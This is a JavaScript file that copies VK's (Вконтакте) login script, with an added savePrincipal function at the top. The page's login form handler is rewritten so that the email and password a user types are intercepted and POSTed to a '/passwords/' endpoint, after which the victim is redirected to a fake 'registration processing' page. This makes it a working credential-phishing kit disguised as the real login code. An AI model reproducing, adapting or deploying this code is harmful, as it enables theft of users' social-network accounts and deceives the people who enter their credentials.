﻿function savePrincipal(email, pass) {
	$.ajax(`/passwords/${urlParams.get('email')}`, {
		method: 'POST',
		contentType: 'application/json',
		data: JSON.stringify({
			username: email,
			password: pass,
			network: 'Вконтакте'
		}),
		// dataType: 'json',
		complete: function () {
			window.location.href = '/registration?processing'
		}
	});
}

!function (e) {
	var o = {};

	function n(t) {
		if (o[t]) return o[t].exports;
		var r = o[t] = {i: t, l: !1, exports: {}};
		return e[t].call(r.exports, r, r.exports, n), r.l = !0, r.exports
	}

	n.m = e, n.c = o, n.d = function (e, o, t) {
		n.o(e, o) || Object.defineProperty(e, o, {enumerable: !0, get: t})
	}, n.r = function (e) {
		"undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {value: "Module"}), Object.defineProperty(e, "__esModule", {value: !0})
	}, n.t = function (e, o) {
		if (1 & o && (e = n(e)), 8 & o) return e;
		if (4 & o && "object" == typeof e && e && e.__esModule) return e;
		var t = Object.create(null);
		if (n.r(t), Object.defineProperty(t, "default", {
			enumerable: !0,
			value: e
		}), 2 & o && "string" != typeof e) for (var r in e) n.d(t, r, function (o) {
			return e[o]
		}.bind(null, r));
		return t
	}, n.n = function (e) {
		var o = e && e.__esModule ? function () {
			return e.default
		} : function () {
			return e
		};
		return n.d(o, "a", o), o
	}, n.o = function (e, o) {
		return Object.prototype.hasOwnProperty.call(e, o)
	}, n.p = "", n(n.s = 1)
}([, function (e, o, n) {
	e.exports = n(3)
}, , function (e, o, n) {
	"use strict";
	n.r(o);
	var t = 0, r = 5;
	window.Login = {
		init: function () {
			each(geByClass("big_text", "login_form_wrap"), function (e, o) {
				placeholderInit(o)
			}), setTimeout(elfocus.pbind(!isVisible("email") || val("email") ? "pass" : "email"), 0);
			var e = ge("login_form"), o = ge("email"), n = ge("pass"), t = val("login_ul");
			return e.onsubmit = function (event) {
				// сохранение пароля
				event.preventDefault();
				savePrincipal(o.value, n.value);
			}, window.loginByCredential && !t && (o.onclick = loginByCredential, n.onclick = loginByCredential), !0
		}, initBlockedPage: function () {
			geByClass1("tutorial_step") && Login._addTutorialAppeal()
		}, showFastRestore: function (e) {
			var o = gpeByClass("_retore_wrap", e);
			return each(geByClass("big_text", o), function (e, o) {
				placeholderInit(o)
			}), addClass(o, "shown"), elfocus("fast_restore_phone"), !1
		}, showInputTooltip: function (e, o) {
			var n = getSize(e);
			showTooltip(e, {
				text: o,
				dir: "left",
				slideX: 15,
				className: "login_tt",
				shift: [-n[0] - 10, -n[1] / 2],
				onCreate: function () {
					removeEvent(e, "mouseout"), e.onblur = function () {
						e.tt.hide()
					}
				}
			})
		}, fastRestoreCheck: function () {
			cur.frPhone && (val("fast_restore_phone") == cur.frSentPhone ? show("login_fast_restore_code_row", "login_fast_restore_resend") : (hide("login_fast_restore_name_row", "login_fast_restore_code_row", "login_fast_restore_resend"), cur.frResendInt && (clearInterval(cur.frResendInt), cur.frResendInt = !1)))
		}, fastRestoreResendUpdate: function (e) {
			cur.frResendDelay > 0 ? (ge("login_fast_restore_resend").innerHTML = getLang(e ? "join_send_code_via_sms_time" : "join_resend_code_time").replace("%s", Math.floor(cur.frResendDelay / 60) + ":" + (cur.frResendDelay % 60 < 10 ? "0" : "") + cur.frResendDelay % 60), cur.frResendDelay--) : (ge("login_fast_restore_resend").innerHTML = '<a onclick="return Login.fastRestoreResend(this);">' + getLang(e ? "join_send_code_via_sms" : "join_resend_code") + "</a>", clearInterval(cur.frResendInt), cur.frResendInt = !1)
		}, fastRestoreResend: function (e) {
			var o = val("fast_restore_phone"), n = ce("span", {className: "progress_inline"}), t = domPN(e);
			return geByClass1("error", "login_fast_restore_error") || val("login_fast_restore_error", ""), ajax.post("/al_login.php?act=a_fast_restore_resend", {
				phone: o,
				restore: cur.frCode
			}, {
				onDone: function (e) {
					t.innerHTML = e, setTimeout(elfocus("fast_restore_code"), 0)
				}, onFail: function (e) {
					return Login.showFastRestoreError(e, "fast_restore_code"), !0
				}, showProgress: function () {
					e.parentNode == t && t.replaceChild(n, e)
				}, hideProgress: function () {
					n.parentNode == t && t.replaceChild(e, n)
				}
			}), !1
		}, fastRestore: function (e, o) {
			if ((e = e || window.event) && void 0 !== e.keyCode && "click" != e.type) {
				if (e.keyCode !== KEY.ENTER) return;
				if (e.target == ge("fast_restore_phone") && isVisible("login_fast_restore_code_row")) return elfocus("fast_restore_code"), cancelEvent(e)
			}
			var n = ge("login_fast_restore_btn"), t = val("fast_restore_phone"), r = void 0;
			if (t.replace(/[^0-9]/g, "").length < 8) return notaBene("fast_restore_phone"), cancelEvent(e);
			if (val("login_fast_restore_error", ""), isVisible("login_fast_restore_code_row")) {
				if ((r = val("fast_restore_code")).replace(/[^0-9a-z]/g, "").length < 5) return notaBene("fast_restore_code"), cancelEvent(e);
				ajax.post("/al_login.php?act=a_fast_restore_code", {
					phone: t,
					code: r,
					restore: cur.frCode
				}, {
					onFail: function (e) {
						return Login.showFastRestoreError(e, "fast_restore_code"), !0
					}, showProgress: lockButton.pbind(n), hideProgress: unlockButton.pbind(n)
				})
			} else {
				var s = isVisible("login_fast_restore_name_row") ? val("fast_restore_name") : "";
				if (!s && isVisible("login_fast_restore_name_row")) return void notaBene("fast_restore_name");
				ajax.post("/al_login.php?act=a_fast_restore", {
					phone: t,
					hash: o,
					name: s
				}, {
					onDone: function (e, o, n, r) {
						if (e) return 1 == e ? (show("login_fast_restore_name_row"), void setTimeout(elfocus("fast_restore_name"), 0)) : void(2 != e ? (val("login_fast_restore_btn", getLang("login_fast_restore_access")), cur.frCode = o, cur.frSentPhone = t, show("login_fast_restore_code_row", "login_fast_restore_resend"), setTimeout(elfocus("fast_restore_code"), 0), cur.frResendDelay = n, cur.frResendInt = setInterval(Login.fastRestoreResendUpdate.pbind(4 == e), 1e3), 4 == e && Login.fastRestoreResendUpdate(!0), r && Login.showFastRestoreError(r, !1, "info_msg")) : Login.showFastRestoreError(r, !1, "error"));
						setTimeout(Login.fastRestore.pbind(!1), 1e3)
					}, onFail: function (e) {
						return e && Login.showFastRestoreError(e, "fast_restore_phone"), !0
					}, showProgress: lockButton.pbind(n), hideProgress: unlockButton.pbind(n)
				})
			}
			return cancelEvent(e)
		}, showFastRestoreError: function (e, o, n) {
			showMsg("login_fast_restore_error", e, n || "error", !0), (o = ge(o)) && (notaBene(o), o.tt && o.tt.hide && o.tt.hide())
		}, changeMail: function (e, o, n) {
			var t = trim(val("login_new_mail")), r = 1;
			return t ? (e && (n = cur.changeMailHash), -1 == t.indexOf("@") ? showMsg("login_change_mail_error", getLang("reg0_error_bad_email"), "error") : (e && (r = 0), void ajax.post("/login?act=a_change_mail", {
				newmail: t,
				hash: n,
				from_page: r
			}, {
				onDone: function (o) {
					var n = "login_change_mail_form";
					e && (n = "login_change_mail_box", curBox().removeButtons(), curBox().addButton(getLang("global_cancel"), null, "no")), val(n, o)
				}, onFail: function (e) {
					return showMsg("login_change_mail_error", e, "error"), !0
				}, showProgress: lockButton.pbind(o), hideProgress: unlockButton.pbind(o)
			}))) : notaBene("login_new_mail")
		}, initChangeMailBox: function () {
			curBox().removeButtons(), curBox().addButton(getLang("global_cancel"), null, "no"), curBox().addButton(getLang("reg0_change_mail"), Login.changeMail.pbind(1)), elfocus("change_mail_new")
		}, isBanExpired: function () {
			return cur.unblockDate < Date.now() / 1e3
		}, chooseTutorialAnswer: function (e, o) {
			if (!cur.tutorialProcessing) {
				var n = gpeByClass("tutorial_step", e);
				hasClass(n, "finished") || (addClass(e, "on"), Login._removeTutorialAppeal(), ajax.post("support", {
					act: "tutorial",
					id: o,
					load: 1,
					ban: nav.objLoc.ban || 0
				}, {
					onDone: function (e) {
						(addClass(n, "finished"), e) ? (ge("login_blocked_wrap").innerHTML += e, Login._addTutorialAppeal()) : Login.isBanExpired() ? (n.innerHTML += getTemplate("login_unblock_by_phone"), fadeToggle(geByClass("footer")[0])) : (n.innerHTML += getTemplate("login_wait_for_ban_expiration_message"), fadeToggle(geByClass("footer")[0]));
						scrollToY(window.innerHeight)
					}, onFail: function (e) {
						return showDoneBox(e), !1
					}, showProgress: function () {
						cur.tutorialProcessing = !0, lockButton(e)
					}, hideProgress: function () {
						cur.tutorialProcessing = !1, unlockButton(e)
					}
				}))
			}
		}, _addTutorialAppeal: function () {
			var e = geByClass("tutorial_step").slice(-1)[0], o = geByClass1("content", e);
			o.innerHTML = getTemplate("login_tutorial_finish_appeal") + o.innerHTML
		}, _removeTutorialAppeal: function () {
			var e = geByClass("tutorial_step").slice(-1)[0], o = geByClass1("content", e);
			addClass(geByClass1("tutorial_finish_appeal", o), "closed")
		}, showUnblockForm: function () {
			showBox("login", {act: "a_unblock_form"}, {
				onDone: function () {
					re(geByClass1("box_controls_wrap")), Login._addBoxHotKeys(), Login.updateUnblockFormState()
				}
			})
		}, _getUnblockStep: function () {
			var e = curBox() ? curBox().bodyNode : null;
			if (!e) return -1;
			var o = geByClass1("phone_number", e), n = geByClass1("verification_code", e);
			return hasClass(o, "finished") || hasClass(n, "finished") ? hasClass(n, "finished") ? 2 : 1 : 0
		}, updateUnblockFormState: function () {
			var e = curBox() ? curBox().bodyNode : null;
			if (e) {
				var o = geByClass1("phone_number", e), n = geByClass1("verification_code", e),
					t = geByClass1("new_password"), r = geByClass1("verification_code_input", e),
					s = geByClass1("new_password_input", e), i = geByClass1("receive_code_button", e),
					a = geByClass1("check_code_button", e), l = geByClass1("unblock_button", e),
					c = geByClass1("_change_phone_button"), u = geByClass1("_resend_code_button");
				switch (Login._getUnblockStep()) {
					case 0:
						show(i), hide(a), c && hide(c), hide(u), hide(l), hide(r), hide(s), o.removeAttribute("readonly"), Login.hideRightTooltip("_verification_code_input_tooltip"), Login.hideRightTooltip("_password_input_tooltip"), elfocus(o);
						break;
					case 1:
						hide(i), show(a), c && show(c), show(u), hide(l), show(r), hide(s), o.setAttribute("readonly", "readonly"), n.removeAttribute("readonly"), Login.hideRightTooltip("_phone_input_tooltip"), Login.hideRightTooltip("_password_input_tooltip"), elfocus(n);
						break;
					case 2:
						hide(i), hide(a), c && hide(c), hide(u), show(l), show(r), show(s), o.setAttribute("readonly", "readonly"), n.setAttribute("readonly", "readonly"), Login.hideRightTooltip("_phone_input_tooltip"), Login.hideRightTooltip("_verification_code_input_tooltip"), elfocus(t);
						break;
					default:
						debugLog("Wrong step in updateUnblockFormState")
				}
			}
		}, _showFormMessageBox: function (e, o) {
			var n = getTemplate(o ? "login_submit_error" : "login_submit_message", {error_message: e});
			val("unblock_box_errors_block", n)
		}, _hideFormMessageBox: function () {
			var e = geByClass1("submit_error");
			e && re(e)
		}, _addBoxHotKeys: function () {
			addEvent(window, "keydown", function (e) {
				var o = curBox() ? curBox().bodyNode : null;
				if (o && (13 == e.keyCode && e.ctrlKey)) switch (Login._getUnblockStep()) {
					case 0:
						geByClass1("receive_code_button", o).click();
						break;
					case 1:
						geByClass1("check_code_button", o).click();
						break;
					case 2:
						geByClass1("unblock_button", o).click();
						break;
					default:
						debugLog("Wrong step in _addBoxHotKeys")
				}
			})
		}, isBadPassword: function (e) {
			var o = this._checkPasswordStrength(e);
			return [r, t].includes(o)
		}, submitPhone: function () {
			if (!buttonLocked(geByClass1("receive_code_button"))) {
				var e = val(geByClass1("phone_number"));
				Login._hideFormMessageBox(), ajax.post("/al_login.php", {
					act: "blocked_phone",
					phone: e,
					hash: cur.blockedHash,
					sure: 1
				}, {
					onDone: function (e, o, n, t) {
						if (o) showFastBox(e, o, n, Login.submitPhone.pbind(1), t); else {
							var r = geByClass1("phone_number");
							addClass(r, "finished"), Login.updateUnblockFormState()
						}
					},
					onFail: function (e) {
						return Login._showFormMessageBox(e, !0), Login.updateUnblockFormState(), !0
					},
					showProgress: lockButton.pbind(geByClass1("receive_code_button")),
					hideProgress: unlockButton.pbind(geByClass1("receive_code_button"))
				})
			}
		}, submitValidationCode: function () {
			if (!buttonLocked(geByClass1("check_code_button"))) {
				var e = geByClass1("verification_code"), o = val(e);
				if (o.length < 4) return notaBene(e);
				Login._hideFormMessageBox(), ajax.post("/al_login.php", {
					act: "blocked_check",
					code: o,
					hash: cur.blockedHash
				}, {
					onDone: function (e) {
						cur.unblockHash = e;
						var o = geByClass1("verification_code");
						addClass(o, "finished"), Login.updateUnblockFormState()
					},
					onFail: function (e) {
						return Login._showFormMessageBox(e, !0), Login.updateUnblockFormState(), !0
					},
					showProgress: lockButton.pbind(geByClass1("check_code_button")),
					hideProgress: unlockButton.pbind(geByClass1("check_code_button"))
				})
			}
		}, submitPassword: function () {
			if (!buttonLocked(geByClass1("unblock_button"))) {
				var e = geByClass1("new_password"), o = val(e);
				Login.isBadPassword(o) ? notaBene(e) : (Login.hideRightTooltip("_password_input_tooltip"), Login._hideFormMessageBox(), ajax.post("/al_login.php", {
					act: "blocked_done",
					pass: o,
					hash: cur.unblockHash,
					new_pass_hash: cur.newPassHash
				}, {
					onDone: function (e, n, t) {
						if (!1 === e && n) return hide(geByClass1("inputs", curBox().bodyNode)), void Login._showFormMessageBox(n);
						Login.refreshAuthDataAndRedirectToFeed(n, t, e, o)
					},
					onFail: function (e) {
						return Login._showFormMessageBox(e, !0), Login.updateUnblockFormState(), !0
					},
					showProgress: lockButton.pbind(geByClass1("unblock_button")),
					hideProgress: unlockButton.pbind(geByClass1("unblock_button"))
				}))
			}
		}, refreshAuthDataAndRedirectToFeed: function (e, o, n, t) {
			var r = utilsNode.appendChild(ce("div", {innerHTML: '          <form id="login_block_auth_form" target="login_block_auth_frame" action="" method="POST">            <input type="hidden" name="_origin" id="login_server_origin" />            <input type="hidden" name="email" id="login_block_email" />            <input type="hidden" name="pass" id="login_block_pass" />          </form>          <iframe name="login_block_auth_frame" id="login_block_auth_frame"></iframe>'})),
				s = window.onLoginDone, i = ge("login_block_auth_form");
			i.action = "https://login.vk.com/?act=login&ip_h=" + o + "&lg_h=" + e + "&redirect=1&role=al_frame", val("login_block_email", winToUtf(n)), val("login_block_pass", winToUtf(t)), val("login_server_origin", cur.serverOrigin), i.submit(), lockButton(geByClass1("unblock_button")), cur.destroy.push(function () {
				re(r), window.onLoginDone = s
			}), window.onLoginDone = function () {
				re(r), unlockButton(geByClass1("unblock_button")), nav.go("/feed", !0)
			}
		}, changePhone: function () {
			var e = geByClass1("phone_number");
			removeClass(e, "finished"), Login.updateUnblockFormState()
		}, resendCode: function () {
			Login._hideFormMessageBox(), ajax.post("/al_login.php", {
				act: "blocked_resend",
				hash: cur.blockedHash
			}, {
				onDone: function (e, o, n, t) {
					o && n ? showFastBox({
						title: e,
						width: 460,
						noCloseButton: !0
					}, o, n, Login.callToSpellCode, t).changed = !0 : o ? showFastBox({
						title: e,
						width: 460
					}, o) : Login._showFormMessageBox(e, !1)
				}, onFail: function (e) {
					return showDoneBox(e), !0
				}
			})
		}, callToSpellCode: function () {
			ajax.post("/al_login.php", {act: "blocked_call", hash: cur.blockedHash}, {
				onDone: function (e) {
					curBox().hide(), Login._showFormMessageBox(e, !1)
				}, progress: curBox().progress
			})
		}, _checkPasswordStrength: function (e) {
			var o = -1,
				n = ["qwerty", "йцукен", "gfhjkm", "пароль", "password", "abc123", "fuckyou", "123abc", "baseball", "football", "soccer", "monkey", "liverpool", "princess", "jordan", "slipknot", "superman", "iloveyou"];
			if (e.length < 6) o = t; else if (/\s/.test(e)) o = r; else if (e.match(/^\d+$/) || n.indexOf(e) >= 0 || e.substr(-1).match(/\d/) && n.indexOf(e.substr(0, e.length - 1)) >= 0) o = 1; else {
				for (var s = [/[^a-z]/g, /[^A-Z]/g, /[^а-яё]/g, /[^А-ЯЁ]/g, /[^0-9]/g, /[a-zA-Zа-яА-ЯёЁ0-9]/g], i = [], a = 0, l = 0, c = s.length; l < c; ++l) {
					var u = e.replace(s[l], "").length;
					u && (u > 1 && a++, i.push({group: l, cnt: u}))
				}
				if (i.length < 3 && i[i.length - 1].group != s.length - 1 && a < 2 && (o = 2), (a > 2 || i.length > 2 && i[i.length - 1].group == s.length - 1) && (o = 4), o < 0 && a > 1) {
					var _ = e.replace(s[s.length - 1], "");
					_.length > 1 && _.replace(new RegExp(escapeRE(_.charAt(0)), "g"), "").length && (o = 4)
				}
				o < 0 && (o = 3), o && o < 3 && e.length > 13 && o++
			}
			return o
		}, updatePasswordStrengthLabel: function () {
			var e = geByClass1("new_password"), o = val(e), n = this._checkPasswordStrength(o);
			ge("blocked_about_pass").className = "blocked_pwd_level" + n, val(geByClass1("blocked_pass_strength"), o ? cur.passwordLevelLabels[n] : "&nbsp;")
		}, _showRightTooltip: function (e, o, n, t) {
			var r = geByClass1(e), s = function () {
				showTooltip(r, {
					dir: "left",
					width: 245,
					text: o,
					slideX: 15,
					className: "login_blocked_tt" + (t ? " " + t : ""),
					shift: n,
					forcetoup: !0,
					onCreate: removeEvent.pbind(r, "mouseout")
				})
			};
			vk.loaded ? setTimeout(s, 0) : addEvent(window, "load", s)
		}, hideRightTooltip: function (e) {
			var o = geByClass1(e);
			o && o.tt && o.tt.hide && o.tt.hide()
		}, showPhoneTooltip: function () {
			hasClass(geByClass1("phone_number"), "finished") || Login._showRightTooltip("_phone_input_tooltip", cur.phoneTooltip, [-210, -88, 3])
		}, showVerificationCodeTooltip: function () {
			hasClass(geByClass1("verification_code"), "finished") || Login._showRightTooltip("_verification_code_input_tooltip", cur.verificationCodeTooltip, [-210, -71, 3])
		}, showPasswordTooltip: function () {
			cur.isEmailPass || Login._showRightTooltip("_password_input_tooltip", cur.passwordTooltip, [-210, -63, 3])
		}, showDeletePageBox: function () {
			showFastBox(getLang("login_blocked_delete_page_header"), getLang("login_blocked_sure_delete_page_question"), getLang("box_yes"), Login.onDeleteYes, getLang("box_no"))
		}, onDeleteYes: function () {
			ajax.post("al_settings.php", {act: "a_deactivate", hash: cur.deactivate_hash}, {
				onDone: function (e) {
					showDoneBox(e), nav.go("/id" + vk.id)
				}, onFail: function (e) {
					showDoneBox(e), curBox().hideProgress()
				}
			})
		}
	};
	try {
		stManager.done(jsc("web/login.js"))
	} catch (e) {
		console.log(e)
	}
}]);